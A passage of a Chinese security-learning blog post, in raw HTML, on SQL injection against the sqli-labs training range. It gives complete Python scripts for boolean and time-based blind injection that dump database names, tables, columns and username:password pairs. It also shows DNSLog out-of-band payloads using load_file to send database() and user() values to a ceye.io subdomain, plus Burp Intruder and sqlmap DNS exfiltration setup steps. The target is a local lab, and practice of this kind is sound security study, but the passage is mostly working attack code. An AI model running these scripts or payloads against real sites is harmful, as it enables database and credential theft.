class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#基于bool盲注</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">url1 = <span class=\"string\">&quot;http://127.0.0.1/sqllabs/Less-5/&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inject_database</span>(<span class=\"params\">url1</span>):</span><br><span class=\"line\">\tname = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">100000</span>):</span><br><span class=\"line\">\t\tlow = <span class=\"number\">32</span></span><br><span class=\"line\">\t\thigh = <span class=\"number\">128</span></span><br><span class=\"line\">\t\tmid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> low &lt; high:</span><br><span class=\"line\">\t\t\tpayload = <span class=\"string\">&quot;1&#x27; and ascii(substr((select database()),%d,1)) &gt; %d-- &quot;</span> % (i, mid)</span><br><span class=\"line\">\t\t\tparams = &#123;<span class=\"string\">&quot;id&quot;</span>: payload&#125;</span><br><span class=\"line\">\t\t\tr = requests.get(url1, params=params)</span><br><span class=\"line\">\t\t\t<span class=\"comment\"># payload = url.format(_ = i, __ = mid)</span></span><br><span class=\"line\">\t\t\t<span class=\"comment\"># r = requests.get(payload)</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> <span class=\"string\">&quot;You are in...........&quot;</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">\t\t\t\tlow = mid + <span class=\"number\">1</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t\t\thigh = mid</span><br><span class=\"line\">\t\t\tmid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> mid == <span class=\"number\">32</span>:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\tname = name + <span class=\"built_in\">chr</span>(mid)</span><br><span class=\"line\">\t\t<span class=\"built_in\">print</span>(name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inject_table</span>(<span class=\"params\">url</span>):</span><br><span class=\"line\">\tname = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">100000</span>):</span><br><span class=\"line\">\t\tlow = <span class=\"number\">32</span></span><br><span class=\"line\">\t\thigh = <span class=\"number\">128</span></span><br><span class=\"line\">\t\tmid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> low &lt; high:</span><br><span class=\"line\">\t\t\tpayload = <span class=\"string\">&quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema = &#x27;sqli&#x27;),%d,1))&gt;%d,1,0)&quot;</span>%(i,mid)</span><br><span class=\"line\">\t\t\tparams = &#123;<span class=\"string\">&#x27;id&#x27;</span>:payload&#125;</span><br><span class=\"line\">\t\t\tr = requests.get(url,params = params)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> <span class=\"string\">&quot;You are in...........&quot;</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">\t\t\t\tlow = mid + <span class=\"number\">1</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t\t\thigh = mid</span><br><span class=\"line\">\t\t\tmid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> mid == <span class=\"number\">32</span>:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\tname = name + <span class=\"built_in\">chr</span>(mid)</span><br><span class=\"line\">\t\t<span class=\"built_in\">print</span>(name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inject_column</span>(<span class=\"params\">url</span>):</span><br><span class=\"line\">\tname = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">100000</span>):</span><br><span class=\"line\">\t\tlow = <span class=\"number\">32</span></span><br><span class=\"line\">\t\thigh = <span class=\"number\">128</span></span><br><span class=\"line\">\t\tmid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> low &lt; high:</span><br><span class=\"line\">\t\t\tpayload = <span class=\"string\">&quot;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = &#x27;flag&#x27;),%d,1))&gt;%d,1,0)&quot;</span>%(i,mid)</span><br><span class=\"line\">\t\t\tparams = &#123;<span class=\"string\">&#x27;id&#x27;</span>:payload&#125;</span><br><span class=\"line\">\t\t\tr = requests.get(url,params = params)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> <span class=\"string\">&quot;You are in...........&quot;</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">\t\t\t\tlow = mid + <span class=\"number\">1</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t\t\thigh = mid</span><br><span class=\"line\">\t\t\tmid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> mid == <span class=\"number\">32</span>:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\tname = name + <span class=\"built_in\">chr</span>(mid)</span><br><span class=\"line\">\t\t<span class=\"built_in\">print</span>(name)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">inject_database(url)</span><br><span class=\"line\"><span class=\"comment\"># inject_table(url)</span></span><br><span class=\"line\"><span class=\"comment\"># inject_column(url)</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#基于时间盲注</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">&quot;http://127.0.0.1/sqllabs/Less-15/&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inject_database</span>(<span class=\"params\">url</span>):</span><br><span class=\"line\">    name = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">100000</span>):</span><br><span class=\"line\">        low = <span class=\"number\">32</span></span><br><span class=\"line\">        high = <span class=\"number\">128</span></span><br><span class=\"line\">        mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> low &lt; high:</span><br><span class=\"line\">            payload = <span class=\"string\">&quot;admin&#x27; and if(ascii(substr((select database()),%d,1))&gt;%d,sleep(1),0)#&quot;</span> % (i, mid)</span><br><span class=\"line\">            data = &#123;<span class=\"string\">&#x27;uname&#x27;</span>: payload, <span class=\"string\">&#x27;passwd&#x27;</span>: <span class=\"string\">&#x27;aaaaa&#x27;</span>&#125;</span><br><span class=\"line\">            <span class=\"comment\">#params = &#123;&quot;id&quot;: payload&#125;</span></span><br><span class=\"line\">            start_time = time.time()  <span class=\"comment\"># 注入前的系统时间</span></span><br><span class=\"line\">            r = requests.post(url, data=data)</span><br><span class=\"line\">            end_time = time.time()  <span class=\"comment\"># 注入后的时间</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> end_time - start_time &gt; <span class=\"number\">1</span>:</span><br><span class=\"line\">                low = mid + <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                high = mid</span><br><span class=\"line\">            mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> mid == <span class=\"number\">32</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        name = name + <span class=\"built_in\">chr</span>(mid)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(name)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inject_table</span>(<span class=\"params\">url</span>):</span><br><span class=\"line\">    name = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">100000</span>):</span><br><span class=\"line\">        low = <span class=\"number\">32</span></span><br><span class=\"line\">        high = <span class=\"number\">128</span></span><br><span class=\"line\">        mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> low &lt; high:</span><br><span class=\"line\">            payload = <span class=\"string\">&quot;1&#x27; and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),%d,1))&gt;%d,sleep(1),0)-- &quot;</span> % (</span><br><span class=\"line\">            i, mid)</span><br><span class=\"line\">            params = &#123;<span class=\"string\">&#x27;id&#x27;</span>: payload&#125;</span><br><span class=\"line\">            start_time = time.time()  <span class=\"comment\"># 注入前的系统时间</span></span><br><span class=\"line\">            r = requests.get(url, params=params)</span><br><span class=\"line\">            end_time = time.time()  <span class=\"comment\"># 注入后的时间</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> end_time - start_time &gt; <span class=\"number\">1</span>:</span><br><span class=\"line\">                low = mid + <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                high = mid</span><br><span class=\"line\">            mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> mid == <span class=\"number\">32</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        name = name + <span class=\"built_in\">chr</span>(mid)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(name)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inject_column</span>(<span class=\"params\">url</span>):</span><br><span class=\"line\">    name = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">100000</span>):</span><br><span class=\"line\">        low = <span class=\"number\">32</span></span><br><span class=\"line\">        high = <span class=\"number\">128</span></span><br><span class=\"line\">        mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> low &lt; high:</span><br><span class=\"line\">            payload = <span class=\"string\">&quot;1&#x27; and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),%d,1))&gt;%d,sleep(1),0)-- &quot;</span> % (</span><br><span class=\"line\">            i, mid)</span><br><span class=\"line\">            params = &#123;<span class=\"string\">&#x27;id&#x27;</span>: payload&#125;</span><br><span class=\"line\">            start_time = time.time()  <span class=\"comment\"># 注入前的系统时间</span></span><br><span class=\"line\">            r = requests.get(url, params=params)</span><br><span class=\"line\">            end_time = time.time()  <span class=\"comment\"># 注入后的时间</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> end_time - start_time &gt; <span class=\"number\">1</span>:</span><br><span class=\"line\">                low = mid + <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                high = mid</span><br><span class=\"line\">            mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> mid == <span class=\"number\">32</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        name = name + <span class=\"built_in\">chr</span>(mid)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(name)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inject_data</span>(<span class=\"params\">url</span>):</span><br><span class=\"line\">    name = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">100000</span>):</span><br><span class=\"line\">        low = <span class=\"number\">32</span></span><br><span class=\"line\">        high = <span class=\"number\">128</span></span><br><span class=\"line\">        mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> low &lt; high:</span><br><span class=\"line\">            payload = <span class=\"string\">&quot;1&#x27; and if(ascii(substr((select concat(username,0x3a,password) from users limit 0,1),%d,1))&gt;%d,sleep(1),0)-- &quot;</span> % (i, mid)</span><br><span class=\"line\">            params = &#123;<span class=\"string\">&#x27;id&#x27;</span>: payload&#125;</span><br><span class=\"line\">            start_time = time.time()  <span class=\"comment\"># 注入前的系统时间</span></span><br><span class=\"line\">            r = requests.get(url, params=params)</span><br><span class=\"line\">            end_time = time.time()  <span class=\"comment\"># 注入后的时间</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> end_time - start_time &gt; <span class=\"number\">1</span>:</span><br><span class=\"line\">                low = mid + <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                high = mid</span><br><span class=\"line\">            mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> mid == <span class=\"number\">32</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        name = name + <span class=\"built_in\">chr</span>(mid)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(name)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">inject_database(url)</span><br><span class=\"line\"><span class=\"comment\"># inject_table(url)</span></span><br><span class=\"line\"><span class=\"comment\"># inject_column(url)</span></span><br><span class=\"line\"><span class=\"comment\"># inject_data(url)</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>注意：</p>\n<p>在 sqllabs 中前 10 关是 get 注入，参数为 id，通过 union select 必须前面查询无结果 union select 才能查询出内容</p>\n<p>在 sqllabs 中 11-14 关是 post 注入，如果采用报错注入，无关注入参数</p>\n<p>但 sqllabs15 关只能使用时间盲注，必须保证注入参数中必须能查询到正确的内容，或者使用 or，最后使用 and ‘1’='1 闭合，但 or 会有 and 和 or 优先级问题。</p>\n<p>mysql 中 and 优先级 高级 or</p>\n<p>1’ or if(ascii(substr(database(),1,1))&gt;100,sleep(3),0) #</p>\n<p>dumb’ and  if(ascii(substr(database(),1,1))&gt;100,sleep(3),0) #</p>\n<p>1’ or if(ascii(substr(database(),1,1))&gt;100,sleep(3),0) and ‘1’='1</p>\n<p>1’ or if(ascii(substr(database(),1,1))&gt;100,sleep(3),0) or ‘1’='1</p>\n<p>或者使用 bool 盲注</p>\n<p>判断是否存在 flag.jpg</p>\n<h5 id=\"搜索注入\"><a class=\"markdownIt-Anchor\" href=\"#搜索注入\">#</a> 搜索注入</h5>\n<p>在 like%% 中注入</p>\n<h5 id=\"dnslog注入\"><a class=\"markdownIt-Anchor\" href=\"#dnslog注入\">#</a> DNSLog 注入</h5>\n<p>前提条件：secure_file_priv 为空</p>\n<p>关于 secure_file_priv :</p>\n<blockquote>\n<p>secure_file_priv 特性，有三种状态</p>\n<ol>\n<li>secure_file_priv 为 null  表示不允许导入导出</li>\n<li>secure_file_priv 指定文件夹时，表示 mysql 的导入导出只能发生在指定的文件夹</li>\n<li>secure_file_priv 没有设置时，则表示没有任何限制</li>\n</ol>\n</blockquote>\n<p>注入使用 load_file 函数</p>\n<p>关于 load_file 函数</p>\n<blockquote>\n<p>LOAD_FILE () 函数读取一个文件并将其内容作为字符串返回</p>\n<p>语法为：load_file (file_name)，其中 file_name 是文件的完整路径</p>\n<p>此函数使用需要满足的条件</p>\n<p>文件必须位于服务器主机上<br>\n你必须具有该 FILE 权限才能读取该文件。拥有该 FILE 权限的用户可以读取服务器主机上的任何文件，该文件是 world-readable 的或 MySQL 服务器可读的，此属性与 secure_file_priv 状态相关<br>\n文件必须是所有人都可读的，并且它的大小小于 max_allowed_packet 字节</p>\n<p>select load_file(’/etc/passwd’);</p>\n</blockquote>\n<p>注入时需要使用 UNC 路径</p>\n<blockquote>\n<p>UNC 路径就是类似 \\softer 这样的形式的网络路径。它符合 \\servername\\sharename 格式，其中 servername 是服务器名，sharename 是共享资源的名称。</p>\n<p>目录或文件的 UNC 名称可以包括共享名称下的目录路径，格式为：\\servername\\sharename\\directory\\filename。</p>\n<p>例如把自己电脑的文件共享，你会获得如下路径，这就是 UNC 路径</p>\n</blockquote>\n<p>常用的 DNSLog 平台</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2NleWUuaW8v\">CEYE - Monitor service for security testing</span></p>\n<p>注入方式：<br>\n1. 注册上述平台，获取自己的 Identifier</p>\n<p>2. 在 payloads 页面找到官方给出的不同数据库适用的 payload</p>\n<p>3. 到测试目标修改并输入 payload</p>\n<p>4. 如果可以明显看到有页面加载的过程，说明外带成功</p>\n<p>下面使用 sqli 靶场做演示：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">and (select load_file(concat(&#x27;//&#x27;,(select database()),&#x27;.3xtn8b.ceye.io/abc&#x27;)))</span><br><span class=\"line\">and (select load_file(concat(&#x27;//&#x27;,(select hex(user())),&#x27;.3xtn8b.ceye.io/abc&#x27;)))</span><br></pre></td></tr></table></figure>\n<p>再到网页中 Records-&gt;DNS Query 即可到的注入的数据</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220215231635316.png\" alt=\"image-20220215231635316\"></p>\n<p>注意：如果注入的字符中带有非法字符，比如 &quot;@&quot;, 需要使用 hex () 进行 16 进制编码，获取数据后在进行解码</p>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMToxODg4OC9zcWxpL2xlc3MtMS8/aWQ9MSUyNyUyMGFuZCUyMChzZWxlY3QlMjBsb2FkX2ZpbGUoY29uY2F0KCUyNy8vJTI3LChzZWxlY3QlMjBoZXgodXNlcigp\">http://127.0.0.1:18888/sqli/less-1/?id=1' and (select load_file(concat('//',(select hex(user()</span>)),%<span class=\"exturl\" data-url=\"aHR0cDovLzI3LjN4dG44Yi5jZXllLmlvL2FiYyUyNw==\">27.3xtn8b.ceye.io/abc'</span>)))%23</p>\n</blockquote>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220215232952016.png\" alt=\"image-20220215232952016\"></p>\n<h5 id=\"使用burpdnslog快速获取全部数据\"><a class=\"markdownIt-Anchor\" href=\"#使用burpdnslog快速获取全部数据\">#</a> 使用 Burp+DNSlog 快速获取全部数据</h5>\n<p>使用 Burp 中的 intruder 模块配合 DNSlog 平台的导出功能。核心是控制 limit x,1 中的变量 x，实现自动查询下一个数据</p>\n<p>参考链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8xMjk5MDQwMjU=\">https://zhuanlan.zhihu.com/p/129904025</span></p>\n<p>发送 URL 到 burp 的测试器</p>\n<p>limit 0，1 后面的 0 设置为变量</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-3309297fe1795a587e808195b6582d15_720w.jpg\" alt=\"img\"></p>\n<p>payload 选择</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-a9c23d520c5668e36296576a81b3605a_720w.jpg\" alt=\"img\"></p>\n<p>线程设置为 1</p>\n<p><img data-src=\"https://pic1.zhimg.com/80/v2-82412940b45778e3dfdbcbd2fd5616a8_720w.jpg\" alt=\"img\"></p>\n<p>然后开始攻击</p>\n<p>完成以后</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-8c1ba9bd1ab38ca059d525044cb30ecb_720w.jpg\" alt=\"img\"></p>\n<p>可以在平台上查到获取到的表名</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-4da5cf686963af08917d23d77e344f3f_720w.jpg\" alt=\"img\"></p>\n<p>平台提供文件导出为 json 文件的功能</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-e825098900bde120e4699a7b23da3cf9_720w.jpg\" alt=\"img\"></p>\n<p>下载到本地，放到脚本目录</p>\n<figure class=\"highlight text\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#python3</span><br><span class=\"line\">import json</span><br><span class=\"line\"></span><br><span class=\"line\">#自己平台的地址</span><br><span class=\"line\">url = &#x27;.xxx.ceye.io&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">f = open(&#x27;./data.json&#x27;)</span><br><span class=\"line\">json_data = f.read()</span><br><span class=\"line\">f.close()</span><br><span class=\"line\"></span><br><span class=\"line\">data = json.loads(json_data)</span><br><span class=\"line\"></span><br><span class=\"line\">data_list = []</span><br><span class=\"line\"></span><br><span class=\"line\">for i in data:</span><br><span class=\"line\">    data_list.append(i[&#x27;name&#x27;].replace(url,&#x27;&#x27;))</span><br><span class=\"line\"></span><br><span class=\"line\">data_list = list(set(data_list))</span><br><span class=\"line\">for i in data_list:</span><br><span class=\"line\">    print(i)</span><br></pre></td></tr></table></figure>\n<p>可以去重以后打印出刚才获取的数据</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-55e96da4d9ec9f31b14522af3a1b419e_720w.png\" alt=\"img\"></p>\n<p>1. 安装 DNS 服务器</p>\n<p>2. 添加正向查找区域</p>\n<p>区域名称为 oupeng.top</p>\n<p>3.DNS 属性中启动递归，启用简单和递归查询</p>\n<p>4. 正向查找中新建主机 ns1 IP 地址为 sqlmapIP</p>\n<p>5. 正向查找新建泛解析，地址为 sqlmapip</p>\n<p>6. 建立条件转发器，DNS 域乱写，IP 写 sqlmap 地址</p>\n<p>7.sqlmap 进攻靶机，dns-domain 写条件转发器的地址</p>\n<h5 id=\"dnslog配和sqlmap进行注入\"><a class=\"markdownIt-Anchor\" href=\"#dnslog配和sqlmap进行注入\">#</a> DNSLog 配和 Sqlmap 进行注入</h5>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220308110248704.png\" alt=\"image-20220308110248704\"></p>\n<p>MX 记录优先级高于 A 记录</p>\n<p>泛域名、泛解析：*.baidu.com 解析全部子域名</p>\n<p>1. 安装 dns 服务器</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020163942115.png\" alt=\"image-20221020163942115\"></p>\n<p>点击下一步，勾选 dns 服务器，其他选项全部默认即可</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164020385.png\" alt=\"image-20221020164020385\"></p>\n<p>连续下一步，之后点击安装，等待安装…<br>\n 安装完成之后在开始管理工具中选择 dns 管理器<br>\n右键，属性</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164223367.png\" alt=\"image-20221020164223367\"></p>\n<p>关闭禁用递归，开启简单和递归查询</p>\n<p><img 